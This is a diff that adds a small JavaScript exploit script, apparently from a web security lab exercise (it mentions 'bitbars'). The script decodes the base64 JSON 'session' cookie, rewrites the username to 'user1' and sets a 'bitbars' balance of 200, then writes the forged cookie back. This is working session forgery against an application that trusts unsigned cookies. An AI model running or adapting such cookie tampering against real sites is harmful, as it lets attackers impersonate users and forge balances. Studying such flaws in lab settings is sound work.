@@ -1,0 +1,13 @@
+function getCookie(name) {
+  var value = "; ".concat(document.cookie);
+  var parts = value.split("; ".concat(name).concat("="));
+  if (parts.length == 2) 
+    return parts.pop().split(";").shift();
+}
+var cookie = getCookie("session");
+var json = atob(cookie);
+var jsonObj = JSON.parse(json);
+jsonObj.account.username = "user1";
+jsonObj.account.bitbars = 200
+var user1Cookie = JSON.stringify(jsonObj);
+document.cookie = "session=".concat(btoa(user1Cookie));
